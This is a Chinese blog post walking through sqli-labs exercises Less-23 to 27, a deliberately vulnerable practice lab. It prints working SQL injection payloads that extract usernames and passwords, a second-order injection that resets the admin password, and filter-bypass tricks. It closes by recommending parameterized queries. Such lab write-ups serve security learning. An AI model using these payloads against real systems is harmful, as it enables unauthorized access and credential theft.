<!doctype html><html lang=zh-cn dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 惯例的前言，虽然没什么可说的。本篇从 page-2 开始，page-2 开头还是 21/22 这两题，base64 编码加上引号注入即可完成。正文从 23 开始。 Less-23 提示 error based,"><title>sqli-labs 实验记录 #4</title>
<link rel=canonical href=https://nnnewb.github.io/blog/p/sqli-labs-training-4/>
<link rel=stylesheet href=/blog/scss/style.min.8620c11ff935a5d342b5db4472643ebc0b4e9d20346a8730d3bf81e0b248f600.css><script src=https://unpkg.com/dayjs@1.8.21/dayjs.min.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/plugin/relativeTime.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/locale/zh-cn.js></script>
<script>dayjs.locale('zh-cn'),dayjs.extend(dayjs_plugin_relativeTime)</script><meta property="og:title" content="sqli-labs 实验记录 #4">
<meta property="og:description" content="前言 惯例的前言，虽然没什么可说的。本篇从 page-2 开始，page-2 开头还是 21/22 这两题，base64 编码加上引号注入即可完成。正文从 23 开始。 Less-23 提示 error based,">
<meta property="og:url" content="https://nnnewb.github.io/blog/p/sqli-labs-training-4/">
<meta property="og:site_name" content="weakptr's 笔记">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="sqli"><meta property="article:tag" content="sqli-labs"><meta property="article:published_time" content="2022-05-12T17:23:32+08:00"><meta property="article:modified_time" content="2022-05-12T17:23:32+08:00">
<meta name=twitter:title content="sqli-labs 实验记录 #4">
<meta name=twitter:description content="前言 惯例的前言，虽然没什么可说的。本篇从 page-2 开始，page-2 开头还是 21/22 这两题，base64 编码加上引号注入即可完成。正文从 23 开始。 Less-23 提示 error based,">
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=/blog>
<img src=/blog/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a>
<span class=emoji>🍑</span>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=/blog>weakptr's 笔记</a></h1>
<h2 class=site-description>弃船！</h2>
</div>
</header><ol class=social-menu>
<li>
<a href=https://github.com/nnnewb/ target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg>
</a>
</li>
</ol><ol class=menu id=main-menu>
<li>
<a href=/blog><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>首页</span>
</a>
</li>
<li>
<a href=/blog/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>关于我</span>
</a>
</li>
<li>
<a href=/blog/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>归档</span>
</a>
</li>
<li>
<a href=/blog/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
<span>分类</span>
</a>
</li>
<li>
<a href=/blog/tags><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11 3l9 9a1.5 1.5.0 010 2l-6 6a1.5 1.5.0 01-2 0L3 11V7a4 4 0 014-4h4"/><circle cx="9" cy="9" r="2"/></svg>
<span>标签</span>
</a>
</li>
<li>
<a href=/blog/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>友链</span>
</a>
</li>
<li>
<a href=/blog/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>搜索</span>
</a>
</li>
<div class=menu-bottom-section>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/blog/categories/security/>
security
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=/blog/p/sqli-labs-training-4/>sqli-labs 实验记录 #4</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2022-05-12T17:23:32+08:00>2022年 5月 12日</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
阅读时长: 6 分钟
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h2 id=前言>前言</h2>
<p>惯例的前言，虽然没什么可说的。本篇从 page-2 开始，page-2 开头还是 21/22 这两题，base64 编码加上引号注入即可完成。正文从 23 开始。</p>
<h2 id=less-23>Less-23</h2>
<p>提示 error based, no comments。所以应该是屏蔽了 <code>--</code>、<code>#</code>和<code>/**/</code>，所以注入要看SQL注入位置的后半句SQL怎么写的了。</p>
<p>尝试用 <code>extractvalue</code> 攻击发现不行。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>?id=1&#39; and extractvalue(1,concat(&#39;~&#39;,password)) or &#39;1&#39;=&#39;1
</code></pre></td></tr></table>
</div>
</div><p>错误：<code>Only constant XPATH queries are supported</code>，<code>updatexml</code>也是一样。换成 <code>group by</code> 法攻击（仅限 MySQL &lt; 5.7.36）。注入<code>1'</code>确认后面跟着的是<code>LIMIT 0,1</code>。</p>
<p>手工调试出一个预期的SQL：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> 
</span><span class=w>	</span><span class=o>*</span><span class=w>
</span><span class=w></span><span class=k>from</span><span class=w> 
</span><span class=w>	</span><span class=c1>-- 从 1&#39; and 开始承接原查询
</span><span class=c1></span><span class=w>	</span><span class=n>id</span><span class=o>=</span><span class=s1>&#39;1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> 
</span><span class=w>	</span><span class=p>(</span><span class=w>
</span><span class=w>        </span><span class=k>select</span><span class=w> 
</span><span class=w>     		</span><span class=mi>123</span><span class=w> </span><span class=c1>-- 子查询包装，把子查询确保 payload 不影响原查询。
</span><span class=c1></span><span class=w>        </span><span class=k>from</span><span class=w> 
</span><span class=w>        	</span><span class=p>(</span><span class=w>
</span><span class=w>                </span><span class=k>select</span><span class=w> 
</span><span class=w>                	</span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=w> 
</span><span class=w>                	</span><span class=n>concat</span><span class=p>(</span><span class=w>
</span><span class=w>                    	</span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=s1>&#39;~&#39;</span><span class=p>,</span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=w> 
</span><span class=w>                        </span><span class=c1>-- 拼接如 username~password 的字符串，limit 避免子查询返回多行出错，也可枚举所有行。目的都是确保能触发 duplicate entry
</span><span class=c1></span><span class=w>                    	</span><span class=s1>&#39;~&#39;</span><span class=p>,</span><span class=w>
</span><span class=w>                    	</span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>14</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span><span class=w>
</span><span class=w>                    </span><span class=p>)</span><span class=w> </span><span class=n>x</span><span class=w> 
</span><span class=w>                </span><span class=k>from</span><span class=w> 
</span><span class=w>                	</span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>all</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=w>
</span><span class=w>                	</span><span class=c1>-- 构造个临时表，两行就够
</span><span class=c1></span><span class=w>                </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> 
</span><span class=w>                	</span><span class=n>x</span><span class=w> </span><span class=c1>-- 在这里触发 duplicate entry 错误
</span><span class=c1></span><span class=w>            </span><span class=p>)</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=c1>-- 避免 Every derived table must have its own alias 错误
</span><span class=c1></span><span class=w>    </span><span class=p>)</span><span class=w> </span><span class=k>and</span><span class=w> 
</span><span class=w>    </span><span class=s1>&#39;1&#39;</span><span class=o>=</span><span class=s1>&#39;1&#39;</span><span class=w> </span><span class=c1>-- 承接原查询的单引号，后面就是原查询的剩余部分了。
</span><span class=c1></span><span class=k>limit</span><span class=w> 
</span><span class=w>	</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><p>提取 Payload：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>?id=1&#39; and (select 123 from (select count(*),concat((select concat(username,&#39;~&#39;,password) from users limit 0,1),&#39;~&#39;,floor(rand(14)*2)) x from (select 1 union all select 2) as t group by x) x) and &#39;1&#39;=&#39;1
</code></pre></td></tr></table>
</div>
</div><p><img src=/blog/p/sqli-labs-training-4/image-20220512133709602.png width=1218 height=435 srcset="/blog/p/sqli-labs-training-4/image-20220512133709602_hud8abda6fb5f8bd1652da864a56d4f695_198434_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512133709602_hud8abda6fb5f8bd1652da864a56d4f695_198434_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512133709602 class=gallery-image data-flex-grow=280 data-flex-basis=672px></p>
<p>成功</p>
<h2 id=less-24>Less-24</h2>
<p>提示 second degree injections ，但谷歌没有找到这个说法，但有另一个说法叫 second-order injection。摘自 portswigger：</p>
<blockquote>
<p>Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.</p>
</blockquote>
<p>再看页面：</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512134251988.png width=1078 height=479 srcset="/blog/p/sqli-labs-training-4/image-20220512134251988_hu0f2b151fbf573c8051608f0a58f64beb_100741_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512134251988_hu0f2b151fbf573c8051608f0a58f64beb_100741_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512134251988 class=gallery-image data-flex-grow=225 data-flex-basis=540px></p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512134257960.png width=721 height=490 srcset="/blog/p/sqli-labs-training-4/image-20220512134257960_hu704286ccb7af4df42963ee95ae469ab7_119881_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512134257960_hu704286ccb7af4df42963ee95ae469ab7_119881_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512134257960 class=gallery-image data-flex-grow=147 data-flex-basis=353px></p>
<p>分别有注册和登陆两个位置，从 second-order injection 的描述来看，如果存在于 Less-24 的话，可能的情况就是在注册接口允许特殊字符比如 <code>admin' or 1=1</code> 作为用户名。</p>
<p>首先尝试了注册正常用户 <code>test123</code> 并登陆，但登录后跳转<code>login.php</code>却没有内容。看来没有更多提示了。</p>
<p>再注册用户 <code>test123'"</code>并登陆，跳转<code>login.php</code> 依然没有内容。这就不懂了，没辙，审下源码。</p>
<p>注册：</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512140810273.png width=742 height=241 srcset="/blog/p/sqli-labs-training-4/image-20220512140810273_huebf7869fb04f3ba97fd6e793e4b2c787_37392_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512140810273_huebf7869fb04f3ba97fd6e793e4b2c787_37392_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512140810273 class=gallery-image data-flex-grow=307 data-flex-basis=738px></p>
<p>立刻注意到<code>mysql_escape_string</code>，可能存在宽字符注入的问题，但和 second-order injection 好像搭不上关系，继续往下看。</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512141813442.png width=854 height=283 srcset="/blog/p/sqli-labs-training-4/image-20220512141813442_hu11baa8e074c48d8282ad32919836a806_42044_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512141813442_hu11baa8e074c48d8282ad32919836a806_42044_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512141813442 class=gallery-image data-flex-grow=301 data-flex-basis=724px></p>
<p>并无特别之处。继续看登陆。</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512142053554.png width=868 height=428 srcset="/blog/p/sqli-labs-training-4/image-20220512142053554_huc050794fffb5892bb09f836cbad175b3_57123_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512142053554_huc050794fffb5892bb09f836cbad175b3_57123_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512142053554 class=gallery-image data-flex-grow=202 data-flex-basis=486px></p>
<p>发现问题了。登陆成功应该设置 <code>Auth</code> 这个 cookie 但我没找到。<code>Location</code> 这个 HTTP 头也没有出现在响应里。这肯定不是正常的挑战，不审阅代码根本看不到这有个 <code>Auth</code> cookie 要设置，还有登陆成功后跳转的位置是 <code>logged-in.php</code>。</p>
<p>看起来是 sqli-labs 自己的 bug。页面上有几个 PHP 的警告：</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512142824705.png width=1682 height=137 srcset="/blog/p/sqli-labs-training-4/image-20220512142824705_hud2604bbbf213c899bb5235f8daa2f6d6_23424_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512142824705_hud2604bbbf213c899bb5235f8daa2f6d6_23424_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512142824705 class=gallery-image data-flex-grow=1227 data-flex-basis=2946px></p>
<p>尝试修复。</p>
<ol>
<li>把<code>Less-24/login.php</code>的<code>&lt;?php</code>标签放到最前，<code>html</code>改成<code>echo &lt;&lt;&lt;END</code> heredoc 形式，放到登陆失败的 <code>else</code> 分支里。</li>
<li>把<code>sql-connections/sql-connect.php</code>的<code>?></code>删除</li>
<li>把<code>sql-connections/db-creds.inc</code>的<code>?></code>删除</li>
</ol>
<p>这和 php 如何发起 HTTP 响应有关系，HTTP 头只能出现在 body 前，如果解释器先遇到了 HTML 或者别的输出语句，那写 body 之前肯定是先把 header 给写完了。开始输出 body 部分后再调用 <code>setcookie</code> 或 <code>header</code> 就已经太迟了，HTTP 头已经发给客户端了。</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512144304913.png width=1092 height=566 srcset="/blog/p/sqli-labs-training-4/image-20220512144304913_hu4b244e74ae756690a2ee967cb6036017_186825_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512144304913_hu4b244e74ae756690a2ee967cb6036017_186825_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512144304913 class=gallery-image data-flex-grow=192 data-flex-basis=463px></p>
<p>修复后成功进入登录后界面，是个修改密码的表单。审代码前盲猜是直接用了 <code>$_SESSION['username']</code> 而没转义导致 second-order injection。</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512144639504.png width=998 height=235 srcset="/blog/p/sqli-labs-training-4/image-20220512144639504_hu32a2e110958d35600cb55959b0f398e7_42917_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512144639504_hu32a2e110958d35600cb55959b0f398e7_42917_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512144639504 class=gallery-image data-flex-grow=424 data-flex-basis=1019px></p>
<p>猜对了。</p>
<p>接着用<code>test123'</code>这个账号登陆试试，触发报错：</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512144850227.png width=345 height=49 srcset="/blog/p/sqli-labs-training-4/image-20220512144850227_hu3b147c4d85e7684d5cf3be4bdfc97e87_4728_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512144850227_hu3b147c4d85e7684d5cf3be4bdfc97e87_4728_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512144850227 class=gallery-image data-flex-grow=704 data-flex-basis=1689px></p>
<p>这里形成的是一个 <code>update</code> 注入，所以注册一个用户名为 <code>test123' or username='admin</code> 的用户即可修改 admin 的密码。</p>
<h2 id=less-25>Less-25</h2>
<p>提示 all your &lsquo;OR&rsquo; and &lsquo;AND&rsquo; belongs to us，服务端过滤了 <code>AND</code> 和 <code>OR</code> 两个关键词，但 <code>UNION ALL</code> 还能用。尝试 <code>?id=0' union all select 1,username,3 from users where '1'='1</code> 成功。但 <code>password</code> 里的 <code>or</code> 也被过滤了。注意页面底部有个 hint 提示过滤后的文本是什么样。</p>
<p>尝试双写 bypass <code>?id=0' union all select 1,username,passwoorrd from users where '1'='1</code></p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512151638205.png width=1079 height=399 srcset="/blog/p/sqli-labs-training-4/image-20220512151638205_hu0fc571f82d87cb839b319785f54001a6_37881_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512151638205_hu0fc571f82d87cb839b319785f54001a6_37881_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512151638205 class=gallery-image data-flex-grow=270 data-flex-basis=649px></p>
<p>成功。</p>
<h2 id=less-26>Less-26</h2>
<p>提示 all your spaces and comments belongs to us，空格和注释会被过滤。</p>
<ul>
<li><code>?id=1';--%20</code>，发现<code>--</code>被过滤</li>
<li><code>?id=1';%23</code>，发现<code>#</code>被过滤</li>
<li><code>?id=1';/*</code>，发现<code>/*</code>被过滤。</li>
</ul>
<p>三种注释符都被过滤了，尝试双写绕过。<code>?id=1';//**</code> 依然被过滤。这就蛋疼了。审一下代码吧。</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512154804832.png width=807 height=215 srcset="/blog/p/sqli-labs-training-4/image-20220512154804832_hu59cb45eb6baf4f616cf0bc88b3adeb2e_38223_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512154804832_hu59cb45eb6baf4f616cf0bc88b3adeb2e_38223_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512154804832 class=gallery-image data-flex-grow=375 data-flex-basis=900px></p>
<p>这些字符都被替换了<code>/*-#\s\\</code>。经过谷歌发现一个绕过的方法，尝试用 ASCII 码表中的特殊空白符绕过。</p>
<p><a class=link href=https://www.jianshu.com/p/ff72f2c6d99c target=_blank rel=noopener>参考：Sqli-Labs：Less 26 - Less 26a</a></p>
<p>先测一遍这些特殊字符：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=k>echo</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/\s/&#39;</span><span class=p>,</span><span class=s1>&#39;@&#39;</span><span class=p>,</span><span class=s2>&#34;1</span><span class=se>\x09</span><span class=s2>2</span><span class=se>\x0a</span><span class=s2>3</span><span class=se>\x0c</span><span class=s2>4</span><span class=se>\x0b</span><span class=s2>5</span><span class=se>\x0d</span><span class=s2>6</span><span class=se>\xa0</span><span class=s2>&#34;</span><span class=p>);</span>
</code></pre></td></tr></table>
</div>
</div><p>发现只有<code>\xa0</code>没有匹配到<code>\s</code>这个正则，接着尝试 union 注入，用<code>%a0</code>替代<code>%20</code>。可以写个脚本把<code>%00</code>到<code>%ff</code>都试一遍看看哪些字符可用。</p>
<p><code>\xa0</code>不在 ascii 码表内，<code>latin1</code>编码中表示<code>non breaking space</code>。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>?id=0&#39;%a0UNION%a0ALL%a0SELECT%a01,2,3%a0FROM%a0users%a0WHERE%a0&#39;1&#39;=&#39;1
</code></pre></td></tr></table>
</div>
</div><p><img src=/blog/p/sqli-labs-training-4/image-20220512160235324.png width=1080 height=410 srcset="/blog/p/sqli-labs-training-4/image-20220512160235324_hu0c21c5b5c9baab5021bff6d0bb98bef9_37435_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512160235324_hu0c21c5b5c9baab5021bff6d0bb98bef9_37435_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512160235324 class=gallery-image data-flex-grow=263 data-flex-basis=632px></p>
<p>注入成功。</p>
<p>另外补充一下关于 AND OR 的绕过方法，使用 <code>preg_replace</code> 替换的话双写就无法绕过了，但还可以考虑用逻辑运算，<code>&&</code>、<code>||</code>以及位运算<code>|</code>、<code>&</code>去组合条件，甚至是算数运算<code>select * from users where (id=1)+(username='Dumb')=2;</code>。</p>
<p>以上就是空格和<code>and</code>、<code>or</code>过滤的绕过方法了。注释感觉没法绕，现在没思路，暂且不谈。</p>
<h2 id=less-27>Less-27</h2>
<p>提示 all your union and select belongs to us ，不能使用 union 注入。测试注入<code>?id=1'</code>报错有回显，字符型注入。考虑限制了 select 查别的表会比较麻烦，先试试能不能绕过 <code>?id=1' uniunionon seselectlect 1,2,3</code></p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512165506110.png width=576 height=50 srcset="/blog/p/sqli-labs-training-4/image-20220512165506110_hu3e8dab28ae6c757455369233587af676_3175_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512165506110_hu3e8dab28ae6c757455369233587af676_3175_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512165506110 class=gallery-image data-flex-grow=1152 data-flex-basis=2764px></p>
<p>发现<code>union</code>成功绕过，但<code>select</code>没有幸免，同时发现空格也被过滤了。修改 payload <code>?id=1'%a0uniunionon%a0SeselectLeCt%a01,2,3</code> 成功大小写绕过。</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512165641965.png width=680 height=54 srcset="/blog/p/sqli-labs-training-4/image-20220512165641965_hu6fd4d023623058a5158adbd868114adc_4749_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512165641965_hu6fd4d023623058a5158adbd868114adc_4749_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512165641965 class=gallery-image data-flex-grow=1259 data-flex-basis=3022px></p>
<p>之后就是常规操作了 <code>?id=0'%a0uniunionon%a0SeselectLeCt%a01,2,3%a0from%a0users%a0where%a0'a'='a</code>，成功。</p>
<p><img src=/blog/p/sqli-labs-training-4/image-20220512165932026.png width=1100 height=398 srcset="/blog/p/sqli-labs-training-4/image-20220512165932026_huf400eb849f98557666dff2e60091d86c_37107_480x0_resize_box_3.png 480w, /blog/p/sqli-labs-training-4/image-20220512165932026_huf400eb849f98557666dff2e60091d86c_37107_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220512165932026 class=gallery-image data-flex-grow=276 data-flex-basis=663px></p>
<h2 id=总结>总结</h2>
<p>page-2 难度果然比 page-1 大很多，今天只做出来5道题，每题都要想一会儿查查资料。</p>
<p>几个意识到的知识点：</p>
<ol>
<li>直接拼接某些函数有问题，或者拼子查询有问题，可以考虑下用<code>select 123 from (select ...)</code>包装一下说不定能省很多事。</li>
<li>second-order injection 的概念，用户输入可能过滤很好，但另一个地方用的时候没过滤，也会造成注入。</li>
<li>几种绕过过滤的方法
<ol>
<li>对<code>and</code>、<code>or</code>用运算符替代的方式绕过。但有经验的开发会屏蔽掉<code>|&amp;;$</code>之类的特殊字符，不一定好绕。</li>
<li>对空格过滤的绕过，<code>latin1</code>编码的空格<code>0xa0</code>。一般开发不容易注意到<code>0xa0</code>能绕过<code>\s</code>正则。</li>
<li>一般关键词用双写、大小写方式绕过，但不一定绕得过去，被禁用的情况下可以考虑下换别的方式。</li>
</ol>
</li>
</ol>
<p>再补充下如何安全开发。其实很简单，用 parameterized query 或者说 prepared statement/query 。目前是最有效的防 SQL 注入的方法，彻底摆脱了上面的过滤、转义等传统攻防对抗，web App 开发者可以从 SQL 注入漏洞的无底深渊里解放出来。</p>
<p>遗憾的是我随便翻了下 github 上的一些新 CMS，虽然有各种 ORM 可以用，现代 DBMS 也早支持了 parameterized query，但还有人在手动拼 SQL =。= 理由就不乱推测了。Go 的 sql 库还是很给力的，直接把 parameterized query 作为最佳实践了，就是还顶不住依然有人在拼字符串=。= 我也是大无语。</p>
<p>那就到这里结束了，辛苦我自己啦！</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/blog/tags/security/>security</a>
<a href=/blog/tags/sqli/>sqli</a>
